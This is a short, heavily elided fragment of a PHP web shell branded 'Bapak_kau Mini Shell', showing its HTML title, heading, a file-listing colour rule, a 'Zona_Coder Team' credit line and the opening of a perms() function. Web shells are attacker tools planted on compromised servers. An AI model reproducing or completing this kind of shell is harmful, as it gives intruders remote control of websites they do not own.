...
<title>Bapak_kau Mini Shell</title><link rel="SHORTCUT ICON"  href="http://i.imgur.com/QYUFm5u.png">
<style>
body{
...
<BODY>
<H1><center>Bapak_kau Mini Shell</center></H1>
...
elseif(!is_readable("$path/$file")) echo '<font color="lime">';
...
echo '<br /><font color="lime"></font><font color="lime">Recode by Bapak_Kau - Zona_Coder Team</font>
</BODY>
</HTML>';
function perms($file){
